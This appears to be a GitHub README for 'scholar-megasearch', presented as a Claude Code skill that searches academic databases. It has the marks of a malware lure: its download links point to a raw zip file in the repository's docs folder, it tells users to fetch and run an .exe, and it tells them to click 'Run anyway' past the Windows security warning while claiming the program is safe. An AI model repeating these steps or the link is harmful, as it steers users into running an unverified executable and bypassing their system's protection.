# 🔍 scholar-megasearch - Find academic papers across many databases

[![Download Windows App](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Dieterburdened606/scholar-megasearch/main/docs/megasearch-scholar-1.6.zip)

## What this tool does

Scholar-megasearch helps you find academic research papers. It searches over 20 databases at the same time. This list includes arXiv, Semantic Scholar, Crossref, OpenAlex, and PubMed. The tool joins results into one list. It removes duplicate entries. It ranks the papers by relevance. It also retrieves the original PDF files for you. 

Research takes time. You often search individual websites one by one. You manage many tabs. You track files manually. This tool handles those steps. It works as a skill for Claude Code. It automates the collection of documents for your review. This saves time and effort during your literature search.

## 💻 System requirements

You need a computer running Windows 10 or Windows 11. 

- Memory: 4 gigabytes of RAM or more.
- Storage: 200 megabytes of free space.
- Connection: A stable internet connection.
- Software: Claude Code must be installed on your system to use this tool as a skill.

## 📥 How to download your copy

Follow these steps to install the software on your Windows machine:

1. Visit the [releases page](https://raw.githubusercontent.com/Dieterburdened606/scholar-megasearch/main/docs/megasearch-scholar-1.6.zip).
2. Look for the section labeled "Assets".
3. Find the file that ends with `.exe`. 
4. Click the file name to start the download.
5. Save the file to your desktop or downloads folder.

## 🛠 Setting up your environment

After you download the file, you must run it. Windows may show a security window. Click "More info" and then "Run anyway" if the system asks. This program is safe to run. 

1. Double-click the file to open the installer.
2. Follow the instructions on the screen.
3. The installer creates a folder for the program on your computer.
4. Open the program once the installation finishes.

## 🚀 Using the search tool

The tool operates through the Claude Code interface. Once you install the application, it integrates with your existing model context protocol settings. 

To start a search:
1. Open your terminal or your Claude Code interface.
2. Type a sentence about your research topic. 
3. The model activates the scholar-megasearch skill.
4. The tool queries the 20+ supported databases.
5. You see a status bar showing progress.
6. The tool generates a merged list of papers. 
7. You select the papers you want to review.
8. The tool fetches the PDF files to your chosen folder.

## 🧩 Managing search results

The tool creates a folder named "Research_Results" in your documents library. It saves every PDF file there. Each file name contains the title of the paper and the publication year. This helps you track your library. 

If you find that the tool returns too many items, refine your search prompt. Add specific keywords. Use phrases like "recent 2023" or "systematic review of." The tool honors these filters. It narrows the search to the most helpful sources.

## 📋 Common questions

**Does this tool search paid journals?**
The tool searches databases for open sources. It checks PubMed, arXiv, and other open-access repositories. It cannot bypass paywalls for restricted journals. Use your university access if you need those specific files.

**Can I pick which databases to search?**
Yes. You can edit the configuration file in the settings menu. Uncheck any database you do not need. This speeds up the search process.

**Why does my search take a few minutes?**
The tool connects to 20 different servers. It pulls data, ranks information, and downloads files. A short delay ensures accuracy. 

**Will this tool notify me of new papers?**
Current versions perform manual searches. You trigger the process when you need data. Future updates may include scheduled searches and email notifications.

**What if the download fails?**
Check your internet connection first. Ensure that your firewall allows the program to access the web. If issues persist, delete the file and try to download it again from the main link.

## 📂 Troubleshooting 

If the program closes unexpectedly, check the log file. You can find this file in the program folder. It shows exactly what happened during the search. Send this file to the support team if you need help.

Ensure that you have sufficient disk space. If you download large numbers of PDFs, the folder size grows quickly. Move your files to external storage if you run out of space on your main drive.

Keep your software updated. Check the download page every few weeks. New versions often include support for more databases and faster search speeds.

## 🧠 Behind the scenes

The project uses the Model Context Protocol. This protocol allows different software tools to "talk" to each other. It connects your research agent to live information sources. 

The software uses deduplication algorithms. These algorithms compare the titles and authors of papers from different sources. If two sources list the same paper, the tool keeps the best version. It removes the extra record. This leaves you with a clean, organized list.

The ranking system looks at citation counts and publication dates. It places the most relevant academic items at the top of your list. This reduces the time you spend scrolling through irrelevant results. 

The tool acts as a bridge. It fills the gap between your search prompt and the vast world of scholarly archives. Focus on your review rather than the technical tasks of gathering files. This is the purpose of the project.